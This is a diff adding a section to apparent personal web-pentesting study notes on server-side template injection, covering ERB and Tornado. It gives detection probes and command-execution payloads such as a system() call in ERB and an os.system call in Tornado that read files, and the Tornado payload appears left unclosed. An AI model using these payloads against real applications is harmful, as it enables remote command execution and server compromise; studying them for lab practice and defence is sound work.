@@ -74,6 +74,31 @@ check this site, https://portswigger.net/web-security/server-side-template-injec
 3. read the documentation
 
 </details>	
+<details>
+<summary>TEMPLATES ENGINES</summary>
+
+<b> >> ERB</b>
+
+it is pretty important to check the documentation, there you can find the different methods or functions that you can call to make the 
+template execute operations.
+	
+common way to test, <b><%= 7*7 %></b>
+common way to execute arbitrary commands, <b><%= system("cat /home/user/mo.txt") %></b>
+
+<b> >> TORNADO</b>
+
+template expressions are surrounded by {}, a simple way to test it is using the following: }}{{7*7}}
+sometimes it is important to make post, or use the site to validate the user and information is valid. 
+
+--> execute python in tornado ? how to do that ?
+
+the "OS" module can be used to run/execute python on a TORNADO template. check the following code to run python.
+you can mix commands to get the desired results, importing the OS module bring the chance to use or call OS commands in general.
+
+{% import os %}{{os.system('cat /home/user/morale.txt')	
+	
+</details>
+	
 </div>
 </pre>
 <button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'">GO BACK</button>
